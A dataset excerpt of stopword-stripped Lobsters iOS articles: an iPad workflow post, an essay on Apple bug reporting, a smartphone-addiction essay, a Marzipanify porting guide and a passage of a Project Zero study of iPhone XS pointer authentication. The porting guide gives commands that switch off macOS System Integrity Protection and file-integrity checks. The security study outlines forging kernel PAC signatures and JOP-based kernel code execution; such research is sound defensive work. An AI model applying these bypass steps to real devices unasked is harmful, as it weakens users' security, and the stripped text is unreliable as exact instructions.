clipboard amazing feature feature allows copy paste one device paste another example copy imac paste ipad text even copypaste image well feature amazing like handoff allows seamlessly switch device copy paste talking copy paste serious issue use remote workstation let say something annoying everything copy unfortunately available io clipboard suppose copy line vim via yy want paste apple note forget possible system use different clipboard need universal clipboard integration remote workstation using ssh blink copying tmux clipboard buffer actually forward io clipboard work mosh hope blink implement document proper clipboard sharing host remote workstation used mosh ssh well notable apps notable apps using think give try ulysses write blog post ulysses might think ordinary markdown editor adding image showing preview publishing writing etc action integrated seamlessly provides one cleanest user experience ever tried many application keep coming ulysses worth every penny write lot paper former many drawing apps like simple use nice tradeoff easiness feature set strong recommendation app like go plenty others try blink already mentioned throughout blog post adding list also terminal emulator please let know think comparable better dash using already macos find great something use also ipad document viewer really great see read api various framework programming language using mainly go stdlib package used almost anything thing one best looking manager expensive need buy app idevices however thing one application full keyboard support many application lack start using addicting way designed feel amazing seen many apps feel natural ipad maybe ulysses cost mentioned many thing throughout blog post think also mention little bit cost planning use ipad main development machine first need remote machine powerful enough meet need minimum per month cloud provider choose know cheaper instance even free tier recommend going need network throughput cpuram blink cost one time purchase quality pro application either subscription ulysses onetime purchase thing entirely depends use case say much think icloud needed nevertheless using plan cost per month cellular ipad pro machine also going pay monthly fee cell provider depends live provider choose let say minimum per month see going pay least per month remote workstation icloud data minimum say icloud also used idevices even think like picked cheapest option remote workstation data plan cellular connectivity certain option minimize cost example could theoretically shut remote instance whenever use start whenever start working let say use throughout night shut verdict using ipad pro starting use sentence start mean couple question copy data form particular website message someone whatsapp lost internet connection need work source code importing editing photo writing blog post note whole article written ipad pro reading book researching etc ordinary stuff possible coding side able develop test ship new feature fixmie however sure could test website fix something authentication workflow mixed feeling issue ipad pro real computer imho laptop replacement know limit going hit wall stuff many time continue ipad use imac finish job using ipad pro mindset going main work machine living constant fear really mean however using ipad mindset great device constant connectivity internet think use almost need thinking differently know limitation therefore prepare decided ipad perfect mobile device work replace main work device macbook imac know sound cool use ipad main development machine however constant limitation hitting frustrating agree people io still limiting several way nonetheless think apple tackle upcoming io release positive believe future development ipad firstclass citizen made far thanks reading please let know question feel free share thought question feedback please feel free share twitter fatih
150,Lobsters,ios,Apple iOS,The Sad State of Logging Bugs for Apple,https://www.corbinstreehouse.com/blog/2019/03/the-sad-state-of-logging-bugs-for-apple/,sad state logging bug apple,http bugreportapplecom happens bug fix never apple,find bug macos io something software working way work decide let apple know head http bugreportapplecom login apple id fill required form list reproduction step hit special key chord generate fat sysdiagnose attach screen shot hope fix happens bug bug tracked internal application called radar internal apple employee simply log bug directly application external people use website bug reporter show specific developer interaction bug hide detail bug detail engineer comment progress bug expect fix build fixed priority priority important bug considered unscreened priority set bug high priority highly likely get fixed whereas bug lower priority likely ever get fixed bug placed particular top level component sub component savvy internal developer log bug directly component bug corresponds appkit nstableview get directly right person need look top level component large dropping area generic bug fall itunes component get saturated bug report bug hit radar someone look developer support often take first look bug related sdkprogramming issue pas specific top level component directly specific component ie nswindow thing get screwy depending component bug land since bug management group dependent many group one two qa people initial screening large drop area bug qa engineer sometimes instructed screen bug priority fix period passing engineer responsible code terrible many engineer look bug low priority much better engineer owns code look bug determine priority qa engineer frequently get huge back log bug screen take week even month bug get screened sometimes lead mass screening bug marking low priority bug originator notice complain priority get increased worse yet group mass close bug older year ask originator reopen bug issue still exists lot people pay attention bug need verification simply become lost internal developer perspective quite frustrating take time log detailed bug see sit unscreened week week demoralizing see happen bug worse yet sometimes bug would get forwardduped someone else later time log bug older bug report get duplicated often simply delayed screening bug external developer perspective even worse little feedback bug progress know priority bug even looked screened apple intentionally opaque transparency could easily leak feature product expected hopefully bug end individual engineer work code lot bug still unscreened apple engineer seem loathe process screening bug let sit around sometimes week month people would rather focus coding something new working already screened bug fix opposed taking time read bug report figure need done read fix right screening determine priority fix sometimes nebulous possibly ask originator information mark duplicate engineer also dislike screening bug sometimes add queue current release increase required workload release something people like instead many bug stay unscreened unscreened bug indicate potential software problem need fixed obviously bad management like high unscreened bug count manager frequently instruct engineer screen bug ask qa engineer bad sometimes qa screen bug low priority hold onto never get moved appropriate code engineer effectively become lost system sadly seen happen way often bug screened low priority nebulousfuture fix date also lost rarely revisited fixed sometimes okay bug obscure rare spend time fixing bug owner want take time go back forth originator find piece information may need sit bug long time eventually try reproduce bug later version unreleased o reproduce assume fixed send back originator particularly bad external developer describe bug sent back fixed internal developer originated bug supposed verify problem resolved send back problem resolved however internal developer really incentive verify bug management keep track bug need verification really require developer verify engineer verify bug like make sure problem resolved external developer left sad state bug becomes closed dead external developer get notified bug fixed fix available public release o mean could take year bug get back external developer since bug start get fixed o released public generally bug ask external developer verify bug installing latest o people including possible need run support older o ability install newer o particular machine want install latest o anything want need run even install o may find bug fixed point simply late engineering likely closed bug lost ether apple simple internal engineer need take responsibility promptly screening bug management need allow engineer time expense working feature fixing already screened bug engineer always expected low unscreened bug count internal engineer need promptly verify bug sent back need install beta version o testing fixed send back bug report refers problem developer look code interacts area described try think would cause problem happen instance button incorrectly disabled itunes developer try figure could happen instead asking reproduce worked apple practiced preaching would screen bug within day would verify bug within week would poke around code attempt make theoretical fix bug reproduce felt like part job thing daily task obviously log bug report okay log bug missing information developer ask specific need general appkit related bug would find sysdiagnose rarely would provide useful information would hate people usually qa engineer worked code would ask sysdiagnose know help figure anything log duplicate know someone else logged bug encountering issue log bug get marked duplicate help increase priority bug sad apple look bug high dupe count looked
151,Lobsters,ios,Apple iOS,Do Not Disturb: Tackling Smartphone Addiction,https://chargen.one/steve/do-not-disturb-how-i-tackled-my-own-smartphone-addiction,disturb tackling smartphone addiction,ruining life hijack thing got control angelheaded hipster flashpoint stage disturb stage notification stage reduce interaction stage trimming apps violating privacy cambridge analytica scandal better ublock origin stage seasonal cleaning great option fediverse mastodon pixelfed final thought,smartphones social medium ruining life say press smartphones social medium biologically unprepared deal smartphones social medium designed hijack attention reward centre brain well nt notice brain altered post write changed smartphone use helped reclaim time attention span ability present moment something lost regained wo nt talk everything instead focus thing talk compiling firmware mainlining fdroid microg time instead post without changing phone never felt connected friend phone absent presence thing got control year ago iphone digital tool used anything else could think pointless app notification came hear noise screen would light pavlovian style would neuron phone went bed woke went work started find getting le happy felt le able concentrate never felt connected friend phone absent presence attention span shrivelled could nt watch whole film reading book impossible pocket free time check facebook twitter instagram email ad nauseum missed bus train absorbed something nt even remember reading forgotten boredom time mind wander became angelheaded hipster burning ancient heavenly connection starry dynamo machinery night lost buzz loweffort connection gained ability connect purpose flashpoint apple pulled plug headphone jack realised time apple product nt want jump apple walled garden google instead tried degoogle life definitely another post process found way make phone work rather found whole new world ethical social medium far gained happiness time space lost buzz loweffort connection gained ability connect purpose wanted sustainable phone experience nt minimalist experience nt phone pared back basic phone experience work everyone sustainable phone experience different journey goal journey encourage reader travel stage disturb first thing reduce volume timing notification receive one best feature android io disturb nt enough alone combined sane rule make break phone since early day blackberry people chained notification notification many problem worst impact sleep disturb help take back sleep also let take back time use disturb setting call message notification notification tusky signal qksms call saturday sunday daytime exception specific contact group specific service using contact group manage exception let family friend reach time call also come someone call time minute work io android stage notification also restrict notification restrict apps send notification restrict apps send notification iphone used ihg app book hotel app used notification update booking also advertised many apps use notification advert nt happen current phone apps trigger notification phone tusky mastodon notification mail notification calendar notification signal messenger message app update notification fdroid yalp everything else check app feel like imagine caring people barely know amazing person world lie next stage reduce interaction try get social medium notify email increase amount step needed respond use dedicated mail account lowvalue mail notification signups respond notification time light pop email notification app still show unread visit set aside time use social network try use purpose instead passively scrolling every minute marizel noticed used phone woke used bed sleeping imagine caring people barely know amazing person world lie next phone stay outside bedroom fact use technology bedroom beyond light radiator room used thing none need complex technology stage trimming apps wan na see home screen deleted facebook light continuous commitment violating privacy cambridge analytica scandal last straw understand many people option example still heavy twitter user often make sad keep home screen reducing amount apps helped lot time nt need app started removing apps nt used month removed apps functioning mobile site bookmarked home screen switched lighter nonofficial social medium client nt bug track alternative help get time back ca nt delete facebook remove app phone much replace dedicated browser app used facebook set facebook mobile site home page browser bonus point dedicated browser app support adblocking find social medium make angry upset consider consider using laptop laptop tend stay online unlike phone tablet using laptop requires conscious decision engage instead passive default still catch friend family facebook need make little effort friction best tool control social medium control use setting adblockers laptop often easier phone said great apps like better worth looking android firefox support addons mobile ublock origin stage seasonal cleaning keep thing light created month folder home screen every month go installed apps nt used app month go month folder mean app home screen taking space use come drawer home screen nt use app month uninstall keep phone light quick clean pretty brutal home screen wallpaper black use dark mode keep screen brightness low icon home screen along two folder month folder discussed earlier folder named nt nt folder hold apps want use le nt nt mean nt use mean nt make default action nt folder currently following apps red reader simplywallst tusky feel relationship app back track take nt decide put next nt improve consider removing nt remove make active decision app future mentioned wallpaper black found great option lockscreens might wondered tusky mastodon well used use facebook twitter instagram find apps would encourage vomit thought argue people share thing upset decided find alternative glad use mastodon much happier alternative twitter mastodon bit like friendlier happier twitter good thing instead instagram use pixelfed still new waiting android app writing use writefreely using read application part something called fediverse noncommercial open way sharing nobody incentivised get like share likewise nobody incentivised like share stuff space tend smaller sometimes le active way healthier ethical social medium le invasive avoids dopaminefeedback loop get commercial network people still contact via social network mastodon pixelfed course plenty option email got rid evil social medium around reclaim life well start setting particular time use social medium check social medium phone mostly start day hour bed rest time need conscious decision use laptop take time reclaim attention span found kindles amazing device wish could find open alternative wanted also found little thing reclaim attention span instead using phone get try make sure marizel first thing see first spend minute watching sleep sometimes think random thing time watch find help focus important usually make u coffee first thing morning look kitchen window kettle boil amazing view phone stay living room give time every day mind wander minute wake make real difference perspective final thought biggest thing accept work progress sometimes going fail going get argument twitter going spend much time app good reason time physically people mentally absent ok important recognise try stop happening next time life surrounded bell flashing light find time present care worth like share world
152,Lobsters,ios,Apple iOS,Bringing iOS Apps to macOS Using Marzipanify,https://www.highcaffeinecontent.com/blog/20190301-Bringing-iOS-Apps-to-macOS-Using-Marzipanify,bringing io apps macos using marzipanify,overview december work chameleon security preparation getting running marzipanify marzipanify marzipanify marzipanify work using marzipanify tuneup one success also able port pspdfkit viewer app advanced functionality make sing future post conclusion stroughtonsmith,wwdc apple gave u perhaps one impactful development macos since transition mac o x uikit apps running desktop today going detail special tool built called marzipanify get started uikit mac early start initial bringup io app macos nt miss post series overview uikit desktop like traditional macos framework systemiossupport directory house web dependency taken io simulator io variant webkit mapkit compiled whole platform macos called iosmac know iosmac another name rumored since december marzipan work another reason iosmac distinction many framework underneath io simulator clash horrendously builtin macos framework thanks decade divergence o x io macos today share uifoundation framework help support uikit appkit provide common code uifoundation make decision runtime based platform running affect everything interface builder text rendering simplest level mean link appkit iosmac app manner thing explode app iosmac linker variant iosmac binary explicitly prevents loading noniosmac binary library code unless whitelisted macos several new component support uikit apps top level uikit app except nt run directly layer hosted another process uikithostappxpc provides appkitbased window chrome bridge mac feature like menu bar toolbar uikithostapp managed singular uikitsystem app act windowprocessevent manager uikitsystem take place springboard traditionally sits io acting shell ui iosmac apps bridging management macos windowserver instead providing homescreen altogether appears running modern uikit macos much complex moreobvious tack chameleon took rewrote uikit mac year ago virtual machine stretch despite evolving io simulator certainly go great length distance mac apps traditionally work perhaps function incomplete state perhaps hint vision new baseline mac apps enough preamble build uikit apps macos security preparation iosmac apps follow modern pattern apple technology entitlementgated mean unless app signed private entitlement apple system refuse launch even developer hoping experiment building iosmac apps early get headstart macos public api unable build run code default macos fortunately macos unlike io system allows completely disable security bypass everything sound terrifying nt forget macos worked default o release ago recent year everything locked tightly disable security first need disable system integrity protection recovery mode add boot argument bypass apple mobile file integrity disabled mac run default wish reenable way recovery mode use terminal csrutil disable nvram bootargs reboot macos proper getting running point could absolutely set build environment iosmac apps arduous complex process form need copy uikit header mac version uikit port uikit tbd linker symbol definition file mac framework set project xcode link mac version uikit systemiossupportprivateframeworksuikitcoreframework create custom linker script pass correct argument build iosmac binary instead macosx binary probably lot recommendation simple even think built much much better safer learning iosmac similarity io simulator hunch one would able make io simulator app run iosmac app studied builtin iosmac apps mojave intently knew macho binary format pretty sure could perform requisite change statically existing binary enter marzipanify marzipanify marzipanify tool created statically convert io app built io simulator macos mean continue working building existing io app existing project using existing io sdk run tool simulator build create functioning mac app bonus marzipanify yell linking framework library nt currently exist iosmac runtime trivializes process focus adapting app rather managing build environment marzipanify work marzipanify five important thing repackages io app format macos happy redirects framework link place iosmac runtime rewrite mach header binary change flag determines whether macosx iosmac binary update infoplist appropriate key iosmac apps resigns app private entitlement iosmac apps require performs step recursively binary embedded framework everything marzipanify done hand repackaging lot moving file around creating correct folder structure redirecting library done installnametool modifying mach header done disassembler hex editor indeed process gradually figured step first place look source code much marzipanify calling commandline tool hard work using marzipanify easy way app dependency target io minimum o marzipanify myappbuiltforsimulatorapp likely way app need target older io marzipanify myappbuiltforsimulatorapp app everything need included iosmac runtime mojave app doubleclick run whoa whoa whoa back bit injectmarzipanglue explain io apple updated default output xcode linker use new load command called lcbuildversion instead traditional lcversionminiphoneos lcversionminmacosx prep environment single binary run io macos iosmac apps included mojave use method system expects iosmac apps catch apps targeting o io use load command trivial add whole new load command existing binary solve problem simplistic way marzipanify mode build library injects app conversion time library us interposing trick dyld linker thinking app running iosmac binary even still macosx binary work hack clearly dragon import foundationfoundationh import objcruntimeh import dlfcnh int dyldgetactiveplatform int mydyldgetactiveplatform return iosmac typedef struct interposes void newfunc void origfunc interposet static const interposet interposingfunctions attribute used section data interpose void mydyldgetactiveplatform void dyldgetactiveplatform tuneup depending complex app point could looking crashreporter window scratching head thing every io framework exists iosmac yet fact webkit mapkit avfoundation nt lot work first iteration iosmac even framework neccessary app might using number class omitted deprecated like uifeedbackgenerator uiwebview mfcomposeviewcontroller stage option start ifdefing portion codebase enough app nonessential feature disabled luck greeted something onscreen little cleanup may working app louis dhauwe pixure sadly longer available one success james thomson also able port io version pcalc macos marzipanify much like peter steinberger pspdfkit viewer app advanced functionality one interesting benefit injectmarzipanglue work marzipanify customize source code want inject target app useful well allows patch apps may source code fact used mechanism port apple contact app macos probably nt something need know work personally like keep separation crazy hack patch might need bringup particular app clean shipping io project make sing apple announced uikit mac mentioned list feature make uikit app feel home desktop menu toolbars mouse event however may realized class included io sdk thus ca nt used io simulator build detail use new macspecific class make app look much like mac app future post conclusion hope given superficial overview marzipanify simple tool kickstart uikit app bringup macos month sdk becomes public certainly need make great uikit mac app enough get started thinking change redesigns might need make app layout prepare future mac bright future uikit mac genuinely believe quick dirty port seen far even apple scratching surface possible developer got ta develop onwards quick dirty port start experimenting always find stroughtonsmith
154,Lobsters,ios,Apple iOS,Examining Pointer Authentication on the iPhone XS,https://googleprojectzero.blogspot.com/2019/02/examining-pointer-authentication-on.html,examining pointer authentication iphone x,,posted brandon azad project zero post examine apple implementation pointer authentication soc used iphone x focus apple improved arm standard demonstrate way use arbitrary kernel readwrite primitive forge kernel pac signature key sufficient execute arbitrary code kernel using jop technique discovered mostly fixed io fact fix first appeared beta research still ongoing pointer authentication among exciting security feature introduced pointer authentication feature upper bit pointer used store pointer authentication code pac essentially cryptographic signature pointer value additional context special instruction introduced add authentication code pointer verify authenticated pointer pac restore original pointer value give system way make cryptographically strong guarantee likelihood certain pointer tampered attacker offer possibility greatly improving application security proper terminology dictate security feature called pointer authentication cryptographic signature inserted unused bit pointer called pointer authentication code pac however popular usage already confused term common see pointer authentication referred pac usually usage unambiguous brevity often refer pointer authentication pac well key insight make pointer authentication viable although pointer bit system virtual address space much smaller leaf unused bit pointer used store additional data case pointer authentication bit used store short authentication code original pointer value context value system allowed use implementationdefined algorithm compute pac standard recommends use block cipher called qarma according whitepaper qarma new family lightweight tweakable block cipher designed specifically pointer authentication variant used standard take input secret key plaintext value pointer tweak context produce output ciphertext truncated ciphertext becomes pac get inserted unused extension bit pointer architecture provides secret pointer authentication key two key apiakey apibkey used instruction pointer another two apdakey apdbkey used data pointer last key apgakey special general key used signing larger block data pacga instruction providing multiple key allows basic protection pointer substitution attack one authenticated pointer substituted another value key set writing special system register register containing pointer authentication key inaccessible meaning userspace process read change however hardware provides key management feature code running exception level manage key next lower exception level introduces three new category instruction dealing pac pac instruction generate insert pac extension bit pointer example pacia compute pac pointer register ainstruction key apiakey using value context write resulting pac pointer back similarly paciza like pacia except context value fixed aut instruction verify pointer pac along context value pac valid pac replaced original extension bit otherwise pac invalid indicating pointer tampered error code placed pointer extension bit fault triggered pointer dereferenced example autia verify pac pointer ainstruction key using context writing valid pointer back successful writing invalid value otherwise xpac instruction remove pointer pac restore original value without performing verification addition general pointer authentication instruction number specialized variant introduced combine pointer authentication existing operation blra instruction perform combined authenticateandbranch operation pointer validated used branch target blr example blraa authenticate pac pointer ainstruction key using context branch resulting address ldra instruction perform combined authenticateandload operation pointer validated data loaded address example ldraa validate pac pointer adata key using context value load value resulting address reta instruction perform combined authenticateandreturn operation link register lr validated ret performed example retab verify lr using binstruction key return known limitation signing gadget start analysis pac mention known limitation pac bypassed attacker readwrite access coerce system executing signing gadget signing gadget instruction sequence used sign arbitrary pointer example attacker trigger execution function read pointer memory add pac writes back use function signing oracle forge pac arbitrary pointer weakness kernel attacker discussed qualcomm whitepaper pointer authentication designed provide protection even attacker arbitrary memory read arbitrary memory write capability important understand limitation design attack model considering kernel attacker already readwrite looking execute arbitrary code forging pac kernel pointer looking specification identified three potential weakness design protecting kernel attacker readwrite reading pac key memory signing kernel pointer userspace signing akey pointer using bkey vice versa discus turn reading pac key kernel memory first let consider perhaps obvious type attack reading pac key kernel memory manually computing pac arbitrary kernel pointer excerpt subsection whitepaper attacker read arbitrary memory pointer authentication designed resist memory disclosure attack pac computed using cryptographically strong algorithm reading number authenticated pointer memory would make easier forge pointer key stored processor register register accessible usermode therefore memory disclosure vulnerability would help extract key used pac generation true description applies specifically attacking userspace program attacking kernel recent io device appear running hypervisor secure monitor meaning kernel running must manage pac key since system register store normal operation cleared core go sleep mean pac key must point stored kernel memory thus attacker kernel memory access could probably read key use manually compute authentication code arbitrary pointer course approach assumes know algorithm used hood generate pac implement userspace knowing apple good chance use custom algorithm place qarma case knowing pac key would nt sufficient forge pac either reverse engineer silicon determine algorithm find way reuse existing machinery forge pointer behalf crossel pac forgery along latter line analysis one possible way would forge pac kernel pointer executing corresponding pac instruction userspace may sound naive reason could work unlikely possible apple decided use pac key case could forge kernel pacia signature example literally executing pacia instruction kernel pointer userspace see arm pseudocode describing implementation pac instruction make distinction whether instruction executed pseudocode addpacia describes implementation pacialike instruction addpacia return value containing x replacing pointer authentication code field bit pointer authentication code pointer authentication code derived using cryptographic algorithm combination x bit addpacia bit x bit boolean boolean bit enable bit case pstateel boolean enable else haveel enable haveel enable return x elsif trappacuse elsif trappacuse else return addpac x false pseudocode implementation addpac addpac calculates pointer authentication code quantity insert pointer authentication code field quantity bit addpac bit ptr bit modifier bit k boolean data bit pac bit result bit extptr bit extfield bit selbit boolean tbi calculatetbi ptr data integer topbit tbi else tagged pointer use regime two ttbrs use bit pointer select upper lower range preserve handle awkward case apparently correct choice upper lower address range ie addr ptrhasupperandloweraddranges else selbit tbi ptr else ptr integer bottompacbit calculatebottompacbit selbit pointer authentication code field take available bit extfield replicate selbit compute pointer authentication code ptr good extension bit tbi extptr ptr extfield ptr else extptr extfield ptr pac computepac extptr modifier k k check ptr good extension bit corrupt pointer authentication code iszero ptr topbit bottompacbit isones ptr topbit bottompacbit pac pac preserve determination upper lower address bit insert pac tbi result ptr selbit pac bottompacbit ptr else result pac selbit pac bottompacbit ptr return result operationally significant difference executing pacia mean apple used pac key exception level simply execute pacia userspace sign kernel pointer course seems highly unlikely apple left obvious hole implementation even symmetry mean could potentially forge kernel pacia signature reading kernel pac key replacing userspace pac key one thread process kernel pac key could indeed forge kernel pointer executing pacia userspace thread would useful apple using unknown algorithm place qarma since could reuse existing signing machinery without reverse engineer crosskey pac forgery another symmetry could potentially leverage produce pac forgery different pac key pacia pacib pacda pacdb reduce implementation hood using different key thus replace one pac key another turn signing gadget one key signing gadget another key would useful example pac algorithm unknown something prevents u setting userspace pac key equal kernel pac key perform crossel forgery forgery strategy much le powerful since need rely existence pac signing gadget known limitation pac technique would free u restriction signing gadget use key trying forge potentially diversifying set available gadget finding entry point kernel code execution theoretical idea might try defeat pac device let look end figure could use pac bypass execute arbitrary code kernel traditional way get kernel code execution via readwrite iokituserclienttrap strategy described stefan esser tale io exploitation strategy involves patching vtable iouserclient instance calling userspace function invokes iokituserclienttrap kernel call arbitrary function argument see work implementation iokituserclienttrap xnu kernreturnt iokituserclienttrap struct iokituserclienttrapargs args kernreturnt result kioreturnbadargument iouserclient userclient userclient osdynamiccast iouserclient iokitlookupconnectrefcurrenttask machportnamet uintptrt args userclientref ioexternaltrap trap ioservice target null trap userclient gettargetandtrapforindex target args index trap target iotrap func func trap func func result target func args args args args args args iokitremoveconnectreference userclient return result patch iouserclient instance gettargetandtrapforindex return controlled value trap target invocation target func call arbitrary kernel function controlled argument target plus see strategy would work device let examine change function introduced pac easiest understand looking disassembly iokituserclienttrap pacibsp call iokitlookupconnectrefcurrenttask args userclientref cast result iouserclient str xzr sp target null ldr userclient vtable autdza validate vtable pac add pointer vmethod vtable ldr vmethod gettargetandtrapforindex movk lsl vmethodpointer ldr args index add sp target mov userclient blraa pac call gettargetandtrapforindex ldr sp target cmp ccmp ne beq trap target ldp trap func func virtual orr cbz func add asr target cbnz mov use context nonvirtual func b handle case trap func virtual method ldp args args ldp args args ldp args args blraa pac call func target mov call iokitremoveconnectreference epilogue retab see several place pac authenticated first omitted assembly brevity happens performing dynamic cast iouserclient userclient vtable validated pacprotected call gettargetandtrapforindex made trap func field read without validation finally value func validated context called actually best case could reasonably hope attacker find legitimate user client provides implementation gettargetandtrapforindex return pointer ioexternaltrap residing writable memory replace trap func paciza function pointer pointer signed apiakey context mean partial pac bypass ability forge paciza pointer would sufficient quick search kernelcache revealed unique iouserclient class fit criterion decompilation gettargetandtrapforindex method ioexternaltrap gettargetandtrapforindex ioservice target unsigned int index target ioservice return index trap field initialized method initializeexternaltraptable heapallocated ioexternaltrap object iomalloc sizeof ioexternaltrap thus need call arbitrary kernel function create connection forge paciza pointer function want call overwrite userclient trap func field paciza pointer invoke userspace give u control argument except explicitly set implementation gettargetandtrapforindex gain control alongside need replace implementation gettargetandtrapforindex vtable mean addition forging paciza pointer function want call also need create fake vtable consisting pacia pointer virtual method need replace existing vtable pointer pacdza pointer fake vtable requires significantly broader pac forgery capability however even manage produce paciza forgery still way gain control jop gadget quick search kernelcache revealed following gadget set mov br give u way call arbitrary kernel function fully controlled argument using single forged pointer use iokituserclienttrap call paciza pointer gadget set want function call set desired value set target function want call analyzing pac know use pac forgery call arbitrary kernel function let begin analyzing apple implementation pac soc weakness ideally find way perform pacia pacda forgery previously discussed even ability forge single paciza pointer sufficient call arbitrary kernel function argument actually perform analysis used voucherswap exploit get kernel readwrite iphone xr running io build finding pac key set first step identify kernel code pac key set unfortunately ida display name special register used store pac key bit digging searching apiakey llvm repository mirror github revealed register used store apiakey called register key similarly named furthermore file declares code register allows u easily search register ida example find set searched string brought identified part commonstart writestatusreg sysregrestore writestatusreg writestatusreg writestatusreg cputtep writestatusreg exceptionvectorsbase readstatusreg writestatusreg isb writestatusreg writestatusreg writestatusreg writestatusreg writestatusreg writestatusreg writestatusreg writestatusreg writestatusreg writestatusreg writestatusreg writestatusreg writestatusreg isb writestatusreg writestatusreg interesting since look like commonstart set pac key constant value every time core start thinking perhaps artifact decompilation checked disassembly ldr packey msr msr add msr msr add msr msr add msr msr add msr msr packey dcq data xref commonstart really initializing pac key constant value quite surprising clearly apple know using constant pac key break pac security guarantee figured must place pac key initialized true runtime value much searching appeared location kernelcache setting key general key still appear b key set place ldr msr msr add msr msr ldr msr msr add msr msr ldr msr msr add msr msr ldr msr msr add msr msr place kernel set pac key follow pattern load offset data structure later identified struct thread setting apibkey value concatenated setting apdbkey value plus one concatenated furthermore location deal specifically context switching thread conspicuously absent list indication pac key changed transitioning exception level either kernel entry eg via syscall kernel exit via eret would strong indication pac key indeed shared userspace kernel subsequently learned proteaswang discovered thing github gist called pacsetkeymd list previously mentioned location understanding correct seemed suggest three disturbing frankly highly unlikely thing first contrary rule cryptography appeared kernel using constant value key general key second key seemed effectively since first second half key third pac key appeared shared userspace kernel meaning userspace could forge kernel pac signature could apple implementation really broken something else going observing runtime behavior order find conducted simple experiment read value global paciza function pointer dataconstconst section many different boot recording value kaslr slide time since number possible kernel slide value relatively small nt long get two separate boot kernel exact location memory meaning original nonpac value pointer would time key really constant value paciza pointer boot since signing algorithm deterministic pointer context value signed time target chose read sysclkopscgettime pointer function rtclockgettime result experiment trial listed colliding run highlighted slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime slide cgettime see even though account ia key pacizas pointer generated across different boot somehow different straightforward solution could think iboot kernel might overwriting packey random value boot commonstart run pac key really different boot even though packey resides textexectext protected writes ktrr still possible modify textexectext ktrr lockdown performed however reading packey runtime showed still contained value something else must going next performed experiment determine whether pac key really shared userspace kernel code suggested executed paciza instruction userspace address rtclockgettime function compared paciza sysclkopscgettime pointer read kernel memory two value differed despite fact pac key userspace kernel appeared conjuring sort dark magic still quite believing packey nt modified runtime tried enumerating bkey value thread system see whether really matched value suggested code looking code switchcontext determined value used seed compute b key loaded offset struct thread mach struct representing thread field present public xnu source decided name packeyseed experiment consisted walking global thread list dumping thread packeyseed found kernel thread indeed using pac key seed thread userspace process using different random seed pid thread pacseed feedfacefeedfacf pid thread pacseed feedfacefeedfacf pid thread pacseed feedfacefeedfacf pid thread pacseed pid thread pacseed thus seem like pac key kernel thread initialized boot yet pac pointer different across boot something fishy going bypass attempt next turned attention bypassing pac using weakness identified section weakness kernel attacker since executing paciza instruction pointer value pac key across different boot producing different result must unidentified source perboot randomness basically spelled doom implement userspace compute pac manually strategy decided try anyway unsurprisingly work next looked whether could set thread pac key equal kernel pac key forge kernel pointer userspace ideally would mean set ia key equal kernel ia key namely however previously discussed one place kernel appears set key commonstart yet userspace kernel pac code different anyway decided combine approach pac crosskey symmetry weakness instead set thread ib key equal kernel ia key allow forge kernel paciza pointer executing pacizb userspace unfortunately naive way overwriting packeyseed field current thread would probably crash panic system since changing pac key thread lifetime break thread existing pac signature pac signature checked time frequently returning function via retab mean way guarantee changing thread pac key nt crash trigger panic ensure thread call return function key changed easiest way spawn thread infinite loop userspace executing pacizb storing result global variable overwrite thread packeyseed force thread offcore using contention looping thread rescheduled b key set via switchcontext forgery executed however result experiment unsuccessful gettime kpaciza upaciza upacizb forge seemed manages break either crossel pac symmetry crosskey pac symmetry gain bit insight devised test specifically crosskey pac symmetry meant setting thread ib key equal db key checking whether output pacizb pacdzb looked similar indicating pac generated since ib db key generated seed set independently actually involved trial first seed value next seed value ib upacizb db upacdzb ib upacizb db upacdzb highlighted row show result executing pacdzb pacizb value userspace key standard implementation pointer authentication expect bit pac agree however two pac seem unrelated suggesting indeed manage break crosskey pac symmetry implementation theory three weakness suggested original design demonstrably applicable time try work really going clear apple considered fact pointer authentication defined standard would little protect kernel attacker readwrite thus decided implement robust defense impossible know exactly without concerted reverse engineering effort speculate based observed behavior first thought apple decided implement secure monitor like done prior device watchtower protect kernel patch secure monitor could trap transition exception level trap writes pac key register could hide true pac key kernel implement shenanigan break pac symmetry however could nt find evidence secure monitor inside kernelcache another alternative apple decided move true pac key even powerful software attacker nt ability read key key could generated randomly boot set via special register iboot key fed whatever algorithm actually used generate pac would combination random key standard key set via special register current exception level example could theoretically store random pac key one pair exception level standard pac key ia ib da db ga pac key used particular operation could xor random pac key corresponding operation eg pacib instruction userspace standard pac key set via standard register eg apibkey design would nt come without challenge example need nonvolatile place store random key core sleep would cleanly break crossel crosskey symmetry prevent key ever disclosed completely mitigating three previously identified weakness could nt figure true implementation decided assume robust design rest research true key random stored soc way bypass strategy found would guaranteed work regardless actual implementation pac elimpersonation zero lead systematic weakness decided time investigate pac signing gadget first pacia instruction occurs function identified vmsharedregionslidepage specifically inlined copy function present xnu source following interesting comment main loop rebaselocation pagecontent delta pageentry rebaselocation delta value memcpy value rebaselocation sizeof value delta value sizeof pointer one pointervalue offsettonextpointer isbind authenticated offsetfromsharedcachebase diversitydata hasaddressdiversity hasdkey hasbkey offsettonextpointer isbind authenticated bool isbind value isbind return kernfailure bool isauthenticated value isauthenticated new value rebase low threaded value plus slide value value slideamount add offset machheader const valueadd sinfo valueadd value valueadd else new value rebase low threaded value plus slide regular pointer need fit value c rtti us top bit allow whole topbyte bottom fit memcpy rebaselocation value sizeof value delta part pointer containing authenticated hasbkey hasdkey bit suggests code dealing authenticated pointer although code actually performs pac operation removed public source furthermore comment c rtti suggests code specifically rebasing userspace code mean kernel would aware maybe perform pac operation userspace pointer looking decompilation loop ida see many operation present public source code slideamount si slide offset uservaddr rebaselocation rebaselocation delta value rebaselocation delta value value isauthenticated value slideamount value slideinfoentry valueadd context value diversitydata value hasaddressdiversity context offset rebaselocation context si unknownfield bootargs bootflags daif readstatusreg daif daif asm msr writestatusreg readstatusreg isb keybits value switch keybits case value ptrauthsign value ptrauthkeyasia context break case value ptrauthsign value ptrauthkeyasib context break case value ptrauthsign value ptrauthkeyasda context break case value ptrauthsign value ptrauthkeyasdb context break writestatusreg readstatusreg isb mlsetinterruptsenabled daif else memmove rebaselocation value delta appears kernel attempting sign pointer behalf userspace interesting previously discussed break crossel symmetry mean kernel signature userspace pointer invalid userspace unlikely freshlyintroduced code broken must mechanism kernel instructs cpu sign userspace pointer instead searching instance pac instruction like pattern begin emerge whenever kernel sign pointer behalf userspace wrap pac instruction clearing 